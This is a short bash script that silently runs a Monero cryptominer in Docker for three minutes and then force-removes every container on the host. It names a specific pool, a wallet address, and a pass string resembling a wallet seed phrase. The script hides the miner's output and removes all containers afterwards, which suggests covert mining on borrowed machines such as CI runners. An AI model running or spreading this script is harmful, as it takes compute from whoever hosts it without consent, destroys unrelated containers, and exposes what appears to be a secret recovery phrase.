#!/bin/bash

TIME=180

time_out()
{
    for i in $(seq 1 $TIME); do
        sleep 1
        echo "$i"
    done
    docker rm -f $(docker ps -aq) || true
}

docker run tpruvot/cpuminer-multi -a cryptonight --threads=2 --url=stratum+tcp://mine.moneropool.com:3333 --user=47jShtAd7JLGEC424E4SVm2AaoAjnAbTpSbpAB3fQ31dfukcY8zpQPzaC7dRRCbUM2TaUV4eVYFbfNbrgaVu2sRNUnXd4rm --pass="sabotage amended gecko jewels amaze bevel unsafe cage september voyage fleet ambush bevel" > /dev/null 2>&1 || true &

time_out
